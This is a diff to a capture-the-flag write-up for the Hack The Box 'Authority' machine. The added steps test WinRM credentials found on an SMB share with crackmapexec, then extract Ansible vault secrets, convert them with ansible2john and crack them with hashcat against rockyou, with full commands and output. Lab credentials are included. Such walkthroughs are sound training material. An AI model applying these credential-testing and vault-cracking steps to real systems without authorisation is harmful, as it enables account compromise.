@@ -125,7 +125,7 @@ nt-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background
 SF-Port8443-TCP:V=7.93%T=SSL%I=7%D=1/9%Time=659D9B87%P=x86_64-pc-linux-gnu
 <SNIP>  
 ```
-Immediately we can note that ldap ssl cert is leaking the AD domain name authority.htb
+Immediately we can take note of the AD domain name ```authority.htb``` that ldap is leaking
 ```console
 389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
 | ssl-cert: Subject:
@@ -135,12 +135,17 @@ Immediately we can note that ldap ssl cert is leaking the AD domain name authori
 |_ssl-date: 2024-01-09T23:17:24+00:00; +4h00m18s from scanner time.
 ```
 
+We can add this to our ```/etc/hosts``` file
+```console
+0ph3@parrot~$ echo '10.10.11.222 authority.htb' >> /etc/hosts
+```
+
 The nmap output has a lot of information so we will try to look at each service individually. 
 It's a good idea prioritize and plan out enumeration when a target has a long list of ports and services.
 Spending a long time trying to brute force 
 
 ### DNS (53/TCP)
-Let's try a DNS zone transfer using the domain name found in the ldap ssl certificate.
+Let's try a DNS zone transfer using the domain name found from ldap
 ```console
 0ph3@parrot~$ dig axfr authority.htb @10.10.11.222
 
@@ -182,7 +187,8 @@ If we wanted to go down this IIS rabbit hole we could maybe try IIS tilde enumer
 ### HTTPS (8443/TCP)
 Navigating to https://10.10.11.222/ redirects to a login page for a [PWM](https://github.com/pwm-project/pwm/) web application. 
 Doing some research reveals PWM is a java based application that allows users to login and submit password resets through LDAP.
-Trying some common default credentials on the login page does not have any sucess.
+Trying some common default credentials on the login page does not have any sucess. It seems that the ldap connection to the directory for authentication is unavailable.
+PWD LOG ATTEMPT PIC
 If we look below the login form, we can see a message stating the application is in configuration mode.
 This misconfiguration allows access to the configuration manager and configuration editor with only a password.
 
@@ -225,12 +231,12 @@ With the share mounted, lets take a look at the contents
         ├── PWM
         └── SHARE
 ```
-The share appears to host folders for different services under the Automation\Ansible folder.
+The share appears to host folders for different services under the Automation/Ansible folder.
 If you are unfamiliar with [Ansible](https://docs.ansible.com/ansible/latest/getting_started/introduction.html), know that it is essentially software used to automate complex tasks.
 It is often used by development teams and IT professionals to automatically deploy, maintain, update and manage software/system components and configurations amongst other uses.
-That being said, the PWM folder looks interesting. With some luck, there may be credentials to the PWM login page we found.
+That being said, the PWM folder looks interesting. With some luck, there may be stored credentials to the PWM login page that we found.
 
-ansible_inventory file seems to contain winrm credentials.
+```ansible_inventory``` file seems to contain winrm credentials.
 ```
 0ph3@parrot~$ cat /mnt/authority/development/Automation/Ansible/PWM/ansible_inventory 
 ansible_user: administrator
@@ -240,12 +246,114 @@ ansible_connection: winrm
 ansible_winrm_transport: ntlm
 ansible_winrm_server_cert_validation: ignore
 ```
-Trying the credentials against the DC fails
+Trying the winrm credentials against the DC fails
+```console
+0ph3@parrot~$ cme winrm authority.htb -u Administrator -p Welcome1
+SMB         authority.htb   5985   AUTHORITY        [*] Windows 10.0 Build 17763 (name:AUTHORITY) (domain:authority.htb)
+HTTP        authority.htb   5985   AUTHORITY        [*] http://authority.htb:5985/wsman
+HTTP        authority.htb   5985   AUTHORITY        [-] authority.htb\Administrator:Welcome1 
+```
+Trying the password for the PWM configuration manager also fails
+pwn pw fail - pic
+While we could go deeper with this and try mutating the password, let's try to avoid another rabbit hole by continuing with our enumeration.
+After more searching, we can find Ansible configuration values in the```PWM/defaults/main.yml``` file.
+```console
+0ph3@parrot~$ cat /mnt/authority/development/Automation/Ansible/PWM/defaults/main.yml 
+---
+pwm_run_dir: "{{ lookup('env', 'PWD') }}"
 
+pwm_hostname: authority.htb.corp
+pwm_http_port: "{{ http_port }}"
+pwm_https_port: "{{ https_port }}"
+pwm_https_enable: true
 
+pwm_require_ssl: false
 
-##
+pwm_admin_login: !vault |
+          $ANSIBLE_VAULT;1.1;AES256
+          32666534386435366537653136663731633138616264323230383566333966346662313161326239
+          6134353663663462373265633832356663356239383039640a346431373431666433343434366139
+          35653634376333666234613466396534343030656165396464323564373334616262613439343033
+          6334326263326364380a653034313733326639323433626130343834663538326439636232306531
+          3438
+
+pwm_admin_password: !vault |
+          $ANSIBLE_VAULT;1.1;AES256
+          31356338343963323063373435363261323563393235633365356134616261666433393263373736
+          3335616263326464633832376261306131303337653964350a363663623132353136346631396662
+          38656432323830393339336231373637303535613636646561653637386634613862316638353530
+          3930356637306461350a316466663037303037653761323565343338653934646533663365363035
+          6531
+
+ldap_uri: ldap://127.0.0.1/
+ldap_base_dn: "DC=authority,DC=htb"
+ldap_admin_password: !vault |
+          $ANSIBLE_VAULT;1.1;AES256
+          63303831303534303266356462373731393561313363313038376166336536666232626461653630
+          3437333035366235613437373733316635313530326639330a643034623530623439616136363563
+          34646237336164356438383034623462323531316333623135383134656263663266653938333334
+          3238343230333633350a646664396565633037333431626163306531336336326665316430613566
+          3764
+```
+The values we are after seem to be encrypted Ansible vault secrets. We can try to crack these values using [hashcat](https://hashcat.net/hashcat/) but first we must convert the encrypted blobs into a format hashcat can recognize by using the ```ansible2john``` tool. We will start by making sure we place each vault into its own file.
+```console
+0ph3@parrot~$ #ls
+ldap_admin_password  pwm_admin_login  pwm_admin_password
+0ph3@parrot~$ cat *
+$ANSIBLE_VAULT;1.1;AES256
+633038313035343032663564623737313935613133633130383761663365366662326264616536303437333035366235613437373733316635313530326639330a643034623530623439616136363563346462373361643564383830346234623235313163336231353831346562636632666539383333343238343230333633350a6466643965656330373334316261633065313363363266653164306135663764
+$ANSIBLE_VAULT;1.1;AES256
+326665343864353665376531366637316331386162643232303835663339663466623131613262396134353663663462373265633832356663356239383039640a346431373431666433343434366139356536343763336662346134663965343430306561653964643235643733346162626134393430336334326263326364380a6530343137333266393234336261303438346635383264396362323065313438
+$ANSIBLE_VAULT;1.1;AES256
+313563383439633230633734353632613235633932356333653561346162616664333932633737363335616263326464633832376261306131303337653964350a363663623132353136346631396662386564323238303933393362313736373035356136366465616536373866346138623166383535303930356637306461350a3164666630373030376537613235653433386539346465336633653630356531
+```
+We can then run ```ansible2john.py``` against all of the vault files to create hashes compatible with ```hashcat``` and redirect the output to the ```ansible_hashes``` file.
+```console
+0ph3@parrot~$ python3 /home/orph3u5/Downloads/ansible2john.py ldap_admin_password pwm_admin_password pwm_admin_login | tee ansible_hashes
+ldap_admin_password:$ansible$0*0*c08105402f5db77195a13c1087af3e6fb2bdae60473056b5a477731f51502f93*dfd9eec07341bac0e13c62fe1d0a5f7d*d04b50b49aa665c4db73ad5d8804b4b2511c3b15814ebcf2fe98334284203635
+pwm_admin_password:$ansible$0*0*15c849c20c74562a25c925c3e5a4abafd392c77635abc2ddc827ba0a1037e9d5*1dff07007e7a25e438e94de3f3e605e1*66cb125164f19fb8ed22809393b1767055a66deae678f4a8b1f8550905f70da5
+pwm_admin_login:$ansible$0*0*2fe48d56e7e16f71c18abd22085f39f4fb11a2b9a456cf4b72ec825fc5b9809d*e041732f9243ba0484f582d9cb20e148*4d1741fd34446a95e647c3fb4a4f9e4400eae9dd25d734abba49403c42bc2cd8
+```
+We can now run hashcat against ```ansible_hashes```. We can grep for ```Ansible``` in hashcat's ```help``` section to find the correct mode number.
+```console
+0ph3@parrot~$ hashcat --help |grep -i Ansible
+  16900 | Ansible Vault                                    | Generic KDF
+```
+
+Running hashcat we find all three vault secrets have a cleartext value of ```!@#$%^&*```
+```console
+0ph3@parrot~$ hashcat -m 16900 --user ansible_hashes /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt                                                                                       
+hashcat (v6.1.1) starting...
+<SNIP>
+Dictionary cache hit:
+* Filename..: /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
+* Passwords.: 14344386
+* Bytes.....: 139921547
+* Keyspace..: 14344386
+
+$ansible$0*0*15c849c20c74562a25c925c3e5a4abafd392c77635abc2ddc827ba0a1037e9d5*1dff07007e7a25e438e94de3f3e605e1*66cb125164f19fb8ed22809393b1767055a66deae678f4a8b1f8550905f70da5:!@#$%^&*
+$ansible$0*0*2fe48d56e7e16f71c18abd22085f39f4fb11a2b9a456cf4b72ec825fc5b9809d*e041732f9243ba0484f582d9cb20e148*4d1741fd34446a95e647c3fb4a4f9e4400eae9dd25d734abba49403c42bc2cd8:!@#$%^&*
+$ansible$0*0*c08105402f5db77195a13c1087af3e6fb2bdae60473056b5a477731f51502f93*dfd9eec07341bac0e13c62fe1d0a5f7d*d04b50b49aa665c4db73ad5d8804b4b2511c3b15814ebcf2fe98334284203635:!@#$%^&*
+                                                  
+Session..........: hashcat
+Status...........: Cracked
+Hash.Name........: Ansible Vault
+Hash.Target......: ansible_hashes
+Time.Started.....: Tue Jan  9 18:09:32 2024 (28 secs)
+Time.Estimated...: Tue Jan  9 18:10:00 2024 (0 secs)
+Guess.Base.......: File (/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:     4373 H/s (12.44ms) @ Accel:512 Loops:64 Thr:1 Vec:8
+Recovered........: 3/3 (100.00%) Digests, 3/3 (100.00%) Salts
+Progress.........: 122880/43033158 (0.29%)
+Rejected.........: 0/122880 (0.00%)
+Restore.Point....: 32768/14344386 (0.23%)
+Restore.Sub.#1...: Salt:2 Amplifier:0-1 Iteration:9984-9999
+Candidates.#1....: dumbo -> loser69
+```
+
 ## User foothold svc_ldap
+
 
 
 
